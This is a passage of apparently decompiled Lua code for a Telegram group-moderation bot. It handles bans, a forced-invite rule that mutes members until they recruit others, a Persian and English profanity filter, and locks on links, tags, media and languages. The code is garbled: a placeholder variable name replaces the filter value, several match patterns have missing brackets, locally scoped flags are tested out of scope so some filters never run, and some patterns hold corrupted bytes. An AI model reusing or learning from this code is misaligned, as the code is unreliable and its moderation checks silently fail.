    if (data.type_).ID == "UserTypeBot" and lock_bots == "yes" then
      kick_user(data.id_, arg.chat_id)
    end
    if is_banUser(data.id_, arg.chat_id) then
      kick_user(data.id_, arg.chat_id)
      if not lang then
        (tdcli.sendMessage)(arg.chat_id, 0, 1, "`This User is Banned From Group!`", 1, "md")
      else
        ;
        (tdcli.sendMessage)(arg.chat_id, 0, 1, "`این کاربر از گروه محروم است!`", 1, "md")
      end
    end
    if is_banall(data.id_) or is_banall(data.username_) then
      kick_user(data.id_, arg.chat_id)
      if not lang then
        (tdcli.sendMessage)(arg.chat_id, 0, 1, "`This User is Globally Banned!`", 1, "md")
      else
        ;
        (tdcli.sendMessage)(arg.chat_id, 0, 1, "`این کاربر از همه گروه ها محروم است!`", 1, "md")
      end
    end
    if lock_join == "yes" and arg.tester == false then
      kick_user(data.id_, arg.chat_id)
    end
    if lock_forcedinvite == "yes" then
      if arg.tester == true and redis:get("CurrentInvite:" .. arg.chat_id .. ":" .. (msg.from).id) ~= "ok" and redis:sismember("GroupSilentUsers:" .. arg.chat_id, (msg.from).id) then
        if not redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
          redis:sadd("GroupSilentUsers:" .. arg.chat_id, data.id_)
        end
        CurrentInvite = redis:get("CurrentInvite:" .. arg.chat_id .. ":" .. (msg.from).id) or 0
        if tonumber(ForcedInvite) <= tonumber(CurrentInvite) + tonumber(arg.nums) then
          redis:set("CurrentInvite:" .. arg.chat_id .. ":" .. (msg.from).id, "ok")
          redis:srem("GroupSilentUsers:" .. arg.chat_id, (msg.from).id)
          if not lang then
            (tdcli.sendMention)(arg.chat_id, 0, (msg.from).first_name .. " (" .. (msg.from).id .. ") Thanks\nYou Have invited " .. ForcedInvite .. " Members For Group And You Can Send Message Now", 0, tonumber(Slen((msg.from).first_name)), (msg.from).id)
          else
            ;
            (tdcli.sendMention)(arg.chat_id, 0, (msg.from).first_name .. " (" .. (msg.from).id .. ") متشکرم\nشما " .. ForcedInvite .. " عضو برای گروه دعوت کردید و الان میتونید پیام ارسال کنید", 0, tonumber(Slen((msg.from).first_name)), (msg.from).id)
          end
        else
          if tonumber(CurrentInvite) + tonumber(arg.nums) < tonumber(ForcedInvite) then
            redis:set("CurrentInvite:" .. arg.chat_id .. ":" .. (msg.from).id, tonumber(CurrentInvite) + tonumber(arg.nums))
            if not lang then
              (tdcli.sendMention)(arg.chat_id, 0, (msg.from).first_name .. " (" .. (msg.from).id .. ")\nNumber of Invited Members By You: " .. CurrentInvite .. "\nYou Must invite " .. ForcedInvite - tonumber(CurrentInvite) .. " other Member", 0, tonumber(Slen((msg.from).first_name)), (msg.from).id)
            else
              ;
              (tdcli.sendMention)(arg.chat_id, 0, (msg.from).first_name .. " (" .. (msg.from).id .. ")\nتعداد اعضا دعوت شده توسط شما: " .. CurrentInvite .. "\nشما باید " .. ForcedInvite - tonumber(CurrentInvite) .. " عضو دیگر دعوت کنید", 0, tonumber(Slen((msg.from).first_name)), (msg.from).id)
            end
          end
        end
      else
        if arg.tester == false and redis:get("CurrentInvite:" .. arg.chat_id .. ":" .. data.id_) ~= "ok" then
          if not redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
            redis:sadd("GroupSilentUsers:" .. arg.chat_id, data.id_)
          end
          CurrentInvite = redis:get("CurrentInvite:" .. arg.chat_id .. ":" .. data.id_) or 0
          if tonumber(CurrentInvite) == 0 then
            if not lang then
              (tdcli.sendMention)(arg.chat_id, 0, data.first_name_ .. " (" .. data.id_ .. ") Welcome\nThis Group is Locked And You Can Not Send Message!\nYou Must invite " .. ForcedInvite .. " Member", 0, tonumber(Slen(data.first_name_)), data.id_)
            else
              ;
              (tdcli.sendMention)(arg.chat_id, 0, data.first_name_ .. " (" .. data.id_ .. ") خوش آمدید\nاین گروه قفل می باشد و شما نمی توانید پیام ارسال کنید!\nشما باید " .. ForcedInvite .. " عضو دعوت کنید", 0, tonumber(Slen(data.first_name_)), data.id_)
            end
          else
            if not lang then
              (tdcli.sendMention)(arg.chat_id, 0, data.first_name_ .. " (" .. data.id_ .. ") Welcome\nYou Can Send Message After invite " .. ForcedInvite - tonumber(CurrentInvite) .. " other Member", 0, tonumber(Slen(data.first_name_)), data.id_)
            else
              ;
              (tdcli.sendMention)(arg.chat_id, 0, data.first_name_ .. " (" .. data.id_ .. ") خوش آمدید\nشما می توانید بعد از دعوت " .. ForcedInvite - tonumber(CurrentInvite) .. " عضو دیگر پیام ارسال کنید", 0, tonumber(Slen(data.first_name_)), data.id_)
            end
          end
        end
      end
    end
  end

              if msg.adduser then
                nums = 0
                for i = 0, #(msg.content_).members_ do
                  nums = tonumber(nums) + 1
                end
                tdcli_function({ID = "GetUser", user_id_ = msg.adduser}, check_newmember, {chat_id = chat, msg_id = msg.id, user_id = user, msg = msg, nums = nums, tester = true})
              end
              if (msg.content_).ID == "MessageChatJoinByLink" then
                tdcli_function({ID = "GetUser", user_id_ = msg.sender_user_id_}, check_newmember, {chat_id = chat, msg_id = msg.id, user_id = user, msg = msg, tester = false})
              end
              local joinedMsg = msg.adduser or (msg.content_).ID == "MessageChatJoinByLink" or (msg.content_).ID == "MessageChatDeleteMember"
              if not redis:get("CurrentInvite:" .. (msg.to).id .. ":" .. (msg.from).id) then
                CurrentInvite = joinedMsg or lock_forcedinvite ~= "yes" or redis:get("NoteForcedInvite:" .. (msg.to).id .. ":" .. (msg.from).id) or 0
                inFinish = ForcedInvite - tonumber(CurrentInvite)
                if CurrentInvite ~= "ok" and inFinish >= 1 then
                  if not redis:sismember("GroupSilentUsers:" .. (msg.to).id, (msg.from).id) then
                    redis:sadd("GroupSilentUsers:" .. (msg.to).id, (msg.from).id)
                    del_msg(chat, tonumber(msg.id))
                  end
                  T_ = redis:get("EditBot:timeinviter") or 1
                  T = tonumber(T_) * 60
                  redis:setex("NoteForcedInvite:" .. (msg.to).id .. ":" .. (msg.from).id, T, true)
                  if not lang then
                    (tdcli.sendMention)((msg.to).id, 0, (msg.from).first_name .. " (" .. (msg.from).id .. ")\nNumber of Invited Members By You: " .. CurrentInvite .. "\nYou Must invite " .. inFinish .. " other Member", 0, tonumber(Slen((msg.from).first_name)), (msg.from).id)
                  else
                    (tdcli.sendMention)((msg.to).id, 0, (msg.from).first_name .. " (" .. (msg.from).id .. ")\nتعداد اعضا دعوت شده توسط شما: " .. CurrentInvite .. "\nشما باید " .. inFinish .. " عضو دیگر دعوت کنید", 0, tonumber(Slen((msg.from).first_name)), (msg.from).id)
                  end
                end
                if is_banall((msg.from).id) then
                  kick_user((msg.from).id, msg.chat_id_)
                  if not lang then
                    (tdcli.sendMessage)(msg.chat_id_, 0, 1, "`This User is Globally Banned!`", 1, "md")
                  else
                    (tdcli.sendMessage)(msg.chat_id_, 0, 1, "`این کاربر از همه گروه ها محروم است!`", 1, "md")
                  end
                end
                if is_banUser(user, chat) then
                  kick_user(user, chat)
                  if not lang then
                    (tdcli.sendMessage)(chat, msg.id_, 1, "`This User is Banned From Group!`", 1, "md")
                  else
                    (tdcli.sendMessage)(chat, msg.id_, 1, "`این کاربر از گروه محروم است!`", 1, "md")
                  end
                end
                do
                  if msg.text and lock_fohsh == "yes" then
                    if not (msg.text):match("[Hh][Aa][Rr][Oo][Mm][Ii]") and not (msg.text):match("[Hh][Aa][Rr][Oo][Mm][Zz][Aa]Dd][Ee]") and not (msg.text):match("[Nn][Aa][Nn][Ee][Kk][Hh][Aa][Rr][Bb]") and not (msg.text):match("[Ff][Uu][Cc][Kk][Yy][Oo][Uu]") and not (msg.text):match("[Dd][Aa]Uu][Ss]") and not (msg.text):match("[Bb][Ee][Gg][Aa]") and not (msg.text):match("[Ss][Pp][Aa][Mm]") and not (msg.text):match("[Bb][Ss][Ii][Kk]") and not (msg.text):match("[Ss][Ii][Kk]") and not (msg.text):match("[Ss][Ii][Kk][Tt][Ii][Rr]") and not (msg.text):match("[Nn][Aa][Nn][Ee][Kk][Ii][Rr][Dd][Oo][Zz][Ee][Dd]") and not (msg.text):match("[Kk][Oo]Ss][Ll][Ii][Ss]") and not (msg.text):match("[Nn][Aa][Nn][Ee][Zz][Ee][Nn][Aa]") and not (msg.text):match("[Kk][Oo][Nn][Dd][Ee]") and not (msg.text):match("[Kk][Oo][Ss] [Kk][Ee][Ss][Ee]") and not (msg.text):match("[Jj][Ee][Nn][Dd][Ee]") and not (msg.text):match("[Mm][Aa][Dd][Aa][Rr] [Jj][Ee][Nn][Dd][Ee][Hh]") and not (msg.text):match("[Kk][Ii][Rr][Aa][Mm] [Dd][Aa][Hh][Aa][Nn]Ee][Tt][Oo][Nn]") and not (msg.text):match("[Dd][Oo][Dd][Oo][Ll]") and not (msg.text):match("[Ss][Hh][Oo][Mm][Bb][Oo][Ll]") and not (msg.text):match("[Cc][Oo][Ss][Ii]") and not (msg.text):match("[Nn][Aa][Nn][Ee] [Cc][Oo][Ss]") and not (msg.text):match("[Cc][Oo][Ss] [Mm][Ee][Mm][Bb][Ee][Rr]") and not (msg.text):match("[Zz][Aa][Nn][Aa] [Zz][Aa][Dd][Ee]") and not (msg.text):match("[Nn][Aa][Nn][Ee] [Oo][Bb][Ii]") and not (msg.text):match("[Kk][Ii][Rr][Ii]") and not (msg.text):match("[Kk][Nn][Oo][Nn][Ii]") and not (msg.text):match("[Nn][Aa][Gg][Ii][Dd][Aa][Mm]") and not (msg.text):match("[Gg][Aa][Ii][Dd][Aa][Mm]") and not (msg.text):match("[Kk][Oo][Ss] [Ll][Ii][Ss]") and not (msg.text):match("[Kk][Oo][Ss] [Mm][Oo][Kk][Hh]") and not (msg.text):match("[Kk][Oo][Ss] [Mm][Aa][Gg][Zz]") and not (msg.text):match("[Kk][Oo][Ss] [Kk][Hh][Oo][Ll]") and not (msg.text):match("[Jj][Aa][Gg][Ii]") and not (msg.text):match("[Jj][Aa][Gg]") and not (msg.text):match("[Kk][Hh][Aa][Rr] [Kk][Oo][Ss][Ee]") and not (msg.text):match("[Kk][Hh][Aa][Rr] [Kk][Oo][Ss][Dd][Ee]") and not (msg.text):match("[Cc][Oo][Cc][Hh][Oo][Ll]") and not (msg.text):match("[Ff][Uu][Cc][Kk]") and not (msg.text):match("[Mm][Aa][Dd][Aa][Rr] [Bb][Ee] [Kk][Aa][Tt][Aa]") and not (msg.text):match("[Hh][Rr][Oo][Mm] [Zz][Aa][Dd][Ee]") and not (msg.text):match("[Bb][Ii] [Gg][Ee][Rr][Aa][Tt]") and not (msg.text):match("[Gg][Aa][Ii][Dd][Ii][Nn]") and not (msg.text):match("[Kk][Oo][Ss][Nn][Aa][Nn][Tt]") and not (msg.text):match("[Kk][Oo][Nn][Ii]") and not (msg.text):match("[Kk][Ii][Rr][Ii]") and not (msg.text):match("[Kk][Ii][Rr]") and not (msg.text):match("[Jj][Ee][Nn][Dd][Ee]") and not (msg.text):match("[Kk][Hh][Aa][Rr]") and not (msg.text):match("[Kk][Oo][Ss][Ii]") and not (msg.text):match("کونی") and not (msg.text):match("کیری") and not (msg.text):match("کص لیس") and not (msg.text):match("کسکش") and not (msg.text):match("کس کش") and not (msg.text):match("کونده") and not (msg.text):match("جنده") and not (msg.text):match("کس ننه") and not (msg.text):match("گاییدم") and not (msg.text):match("نگاییدم") and not (msg.text):match("بگا") and not (msg.text):match("گاییدن") and not (msg.text):match("دیوث") and not (msg.text):match("ننه الکسیس") and not (msg.text):match("ننه زنا") and not (msg.text):match("ننه کیر دزد") and not (msg.text):match("زنازاده") and not (msg.text):match("مادر به خطا") and not (msg.text):match("کسمخ") and not (msg.text):match("کسخل") and not (msg.text):match("کسمغز") and not (msg.text):match("ننه خراب") and not (msg.text):match("کیرم دهنت") and not (msg.text):match("کیرم دهنتون") and not (msg.text):match("حروم زاده") and not (msg.text):match("فاک") and not (msg.text):match("فاک یو") and not (msg.text):match("قرومصاق") and not (msg.text):match("بی غیرت") and not (msg.text):match("کس ننت") and not (msg.text):match("جق") and not (msg.text):match("جقی") and not (msg.text):match("جق زن") and not (msg.text):match("شومبول") and not (msg.text):match("چوچول") and not (msg.text):match("چوچوله") and not (msg.text):match("دودول") and not (msg.text):match("ننه چس") and not (msg.text):match("چسی") and not (msg.text):match("چس ممبر") and not (msg.text):match("اوبی") and not (msg.text):match("قحبه") and not (msg.text):match("بسیک") and not (msg.text):match("سیکتر") and not (msg.text):match("سیک") and not (msg.text):match("خوارکسته") and not (msg.text):match("خوارکسده") and not (msg.text):match("عوضی") and not (msg.text):match("کیر") and not (msg.text):match("[Kk][Ii][Rr]") then
                      local BadWords = (msg.text):match("کص")
                    end
                    if BadWords then
                      del_msg(chat, tonumber(msg.id))
                    end
                  end
                  if msg.text then
                    Filters = redis:smembers("GroupFilterList:" .. msg.chat_id_)
                    for k,v in pairs(Filters) do
                      if ((_ENV.string).find)(((_ENV.string).lower)(msg.text), ((_ENV.string).lower)(R55_PC1650)) then
                        del_msg(chat, tonumber(msg.id))
                      end
                    end
                  end
                  if msg.edited and lock_edit == "yes" then
                    del_msg(chat, tonumber(msg.id))
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "edit IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                  end
                  if msg.forward_info_ then
                    redis:incr("getForwardMessages:" .. user .. ":" .. chat)
                  end
                  if msg.forward_info_ and mute_forward == "yes" then
                    _ENV.LockName = "forward"
                    del_msg(chat, tonumber(msg.id))
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "forward IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                    if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                      (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                    end
                  elseif (msg.content_).ID == "MessageForwardedFromUser" and mute_forward == "no" and sense then
                    (_ENV.CheckLockDaily)(msg, "forward", "m")
                  end
                  if (msg.content_).ID == "MessagePhoto" then
                    if mute_photo == "yes" then
                      _ENV.LockName = "photo"
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "photo IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                      end
                    elseif mute_photo == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "photo", "m")
                    end
                  end
                  if (msg.content_).ID == "MessageVideo" then
                    if mute_video == "yes" then
                      _ENV.LockName = "video"
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "video IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                      end
                    elseif mute_video == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "video", "m")
                    end
                  end
                  if (msg.content_).ID == "MessageDocument" and mute_document == "yes" then
                    _ENV.LockName = "document"
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "document IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                    if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                      (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                    end
                  elseif (msg.content_).ID == "MessageDocument" and mute_document == "no" and sense then
                    (_ENV.CheckLockDaily)(msg, "document", "m")
                  end
                  if (msg.content_).ID == "MessageSticker" then
                    if mute_sticker == "yes" then
                      _ENV.LockName = "sticker"
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "sticker IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                      end
                    elseif mute_sticker == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "sticker", "m")
                    end
                  end
                  if (msg.content_).ID == "MessageAnimation" then
                    if mute_gif == "yes" then
                      _ENV.LockName = "gif"
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "gif IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                      end
                    elseif mute_gif == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "gif", "m")
                    end
                  end
                  if (msg.content_).ID == "MessageContact" and mute_contact == "yes" then
                    _ENV.LockName = "contact"
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "contact IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                    if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                      (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                    end
                  elseif (msg.content_).ID == "MessageContact" and mute_contact == "no" and sense then
                    (_ENV.CheckLockDaily)(msg, "contact", "m")
                  end
                  if (msg.content_).ID == "MessageLocation" and mute_location == "yes" then
                    _ENV.LockName = "location"
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "location IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                    if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                      (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                    end
                  elseif (msg.content_).ID == "MessageLocation" and mute_location == "no" and sense then
                    (_ENV.CheckLockDaily)(msg, "location", "m")
                  end
                  if (msg.content_).ID == "MessageVoice" then
                    if mute_voice == "yes" then
                      _ENV.LockName = "voice"
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "voice IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                      end
                    elseif mute_voice == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "voice", "m")
                    end
                  end
                  if msg.content_ and mute_keyboard == "yes" then
                    _ENV.LockName = "keyboard"
                    if msg.reply_markup_ and (msg.reply_markup_).ID == "ReplyMarkupInlineKeyboard" then
                      del_msg(chat, tonumber(msg.id))
                    end
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "keyboard IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                    if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                      (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                    end
                  elseif (msg.content_).ID == "MessageContact" and mute_keyboard == "no" and sense then
                    (_ENV.CheckLockDaily)(msg, "keyboard", "m")
                  end
                  if tonumber(msg.via_bot_user_id_) ~= 0 and mute_inline == "yes" then
                    _ENV.LockName = "inline"
                    del_msg(chat, tonumber(msg.id))
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "inline IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                    if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                      (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                    end
                  elseif tonumber(msg.via_bot_user_id_) ~= 0 and mute_inline == "no" and sense then
                    (_ENV.CheckLockDaily)(msg, "inline", "m")
                  end
                  if (msg.content_).ID == "MessageGame" and mute_game == "yes" then
                    _ENV.LockName = "game"
                    if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                      (_ENV.SenseGiveWarn)(msg, "game IS Locked!")
                    end
                    if redis:ttl("CheckThisMsg" .. user) < 0 then
                      redis:setex("CheckThisMsg" .. user, 60, true)
                    end
                    if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                      (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                    end
                  elseif (msg.content_).ID == "MessageGame" and mute_game == "no" and sense then
                    (_ENV.CheckLockDaily)(msg, "game", "m")
                  end
                  if (msg.content_).ID == "MessageAudio" then
                    if mute_audio == "yes" then
                      _ENV.LockName = "audio"
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "audio IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "m")
                      end
                    elseif mute_audio == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "audio", "m")
                    end
                  end
                  if not msg.text and not (msg.media).caption and not joinedMsg and lock_withcaption == "yes" then
                    del_msg(chat, tonumber(msg.id))
                  end
                  if (msg.media).caption then
                    if lock_nocaption == "yes" then
                      del_msg(chat, tonumber(msg.id))
                    end
                    if not ((msg.media).caption):match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") and not ((msg.media).caption):match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") and not ((msg.media).caption):match("[Tt].[Mm][Ee]/") then
                      local link_caption = ((msg.media).caption):match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/")
                    end
                    if link_caption then
                      redis:incr("getLinkMessages:" .. user .. ":" .. chat)
                    end
                    if link_caption and lock_link == "yes" then
                      _ENV.LockName = "link"
                      del_msg(chat, tonumber(msg.id))
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "link IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "l")
                      end
                    elseif link_caption and lock_link == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "link", "l")
                    end
                    local usrn_caption = ((msg.media).caption):match("@")
                    if usrn_caption and lock_username == "yes" then
                      del_msg(chat, tonumber(msg.id))
                    end
                    local tag_caption = ((msg.media).caption):match("#")
                    if tag_caption and lock_tag == "yes" then
                      _ENV.LockName = "tag"
                      del_msg(chat, tonumber(msg.id))
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "tag IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "l")
                      end
                    elseif tag_caption and lock_tag == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "tag", "l")
                    end
                    if redis:sismember("GroupFilterList:" .. (msg.to).id, (msg.media).caption) then
                      del_msg(chat, tonumber(msg.id))
                    end
                    local arabic_caption = ((msg.media).caption):match("[\216-�][\128-�]")
                    if arabic_caption and lock_arabic == "yes" then
                      del_msg(chat, tonumber(msg.id))
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "arabic IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                    end
                    local eng_caption = ((msg.media).caption):match("[AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz]")
                    if eng_caption and lock_english == "yes" then
                      del_msg(chat, tonumber(msg.id))
                    end
                  end
                  if msg.text then
                    if lock_spam == "yes" then
                      local _nl, ctrl_chars = ((_ENV.string).gsub)(msg.text, "%c", "")
                      local _nl, real_digits = ((_ENV.string).gsub)(msg.text, "%d", "")
                      if 2049 < ((_ENV.string).len)(msg.text) or 40 < ctrl_chars or 2000 < real_digits then
                        del_msg(chat, tonumber(msg.id))
                      end
                    end
                    if not (msg.text):match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") and not (msg.text):match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") and not (msg.text):match("[Tt].[Mm][Ee]/") then
                      local link_msg = (msg.text):match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/")
                    end
                    if link_msg then
                      redis:incr("getLinkMessages:" .. user .. ":" .. chat)
                    else
                      redis:incr("getTextMessages:" .. user .. ":" .. chat)
                    end
                    if link_msg and lock_link == "yes" then
                      _ENV.LockName = "link"
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "link IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "l")
                      end
                    elseif link_msg and lock_link == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "link", "l")
                    end
                    local usrn_msg = (msg.text):match("@")
                    if usrn_msg and lock_username == "yes" and not redis:get("Allow~" .. msg.text .. "From~" .. msg.chat_id_) then
                      del_msg(chat, tonumber(msg.id))
                    end
                    local tag_msg = (msg.text):match("#")
                    if tag_msg and lock_tag == "yes" and not redis:get("Allow~" .. msg.text .. "From~" .. msg.chat_id_) then
                      _ENV.LockName = "tag"
                      del_msg(chat, tonumber(msg.id))
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "tag IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                      if redis:ttl("CheckDailyExpire" .. _ENV.LockName .. ":GP:" .. chat) < 0 and redis:ttl("CheckDaily" .. _ENV.LockName .. ":GP:" .. chat) > 0 then
                        (_ENV.CheckExpireLockDaily)(msg, _ENV.LockName, "l")
                      end
                    elseif tag_msg and lock_tag == "no" and sense then
                      (_ENV.CheckLockDaily)(msg, "tag", "l")
                    end
                    local arabic_msg = (msg.text):match("[\216-�][\128-�]")
                    if arabic_msg and lock_arabic == "yes" then
                      del_msg(chat, tonumber(msg.id))
                      if sense and redis:ttl("CheckThisMsg" .. user) > 0 then
                        (_ENV.SenseGiveWarn)(msg, "arabic IS Locked!")
                      end
                      if redis:ttl("CheckThisMsg" .. user) < 0 then
                        redis:setex("CheckThisMsg" .. user, 60, true)
                      end
                    end
                    local eng_text = (msg.text):match("[AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz]")
